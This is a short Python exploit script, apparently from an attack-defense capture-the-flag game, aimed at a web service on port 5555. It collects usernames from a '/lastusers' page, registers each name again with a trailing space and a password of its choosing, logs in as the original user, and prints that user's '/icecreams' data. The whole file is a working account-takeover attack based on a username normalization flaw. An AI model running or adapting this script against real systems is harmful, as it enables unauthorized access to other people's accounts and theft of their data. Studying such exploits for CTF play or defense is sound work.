import sys
import requests
import re

URL = 'http://%s:5555' % sys.argv[1]

resp = requests.get(URL + '/lastusers')

users = re.findall('<br>(\w*)', resp.text)

for u in users:
    requests.get(URL + '/registerForm', params={'login': u + ' ', 'password': 'somepassword'})
    s = requests.Session()
    s.get(URL + '/loginForm', params={'login': u, 'password': 'somepassword'})
    r = s.get(URL + '/icecreams')
    print(r.text)
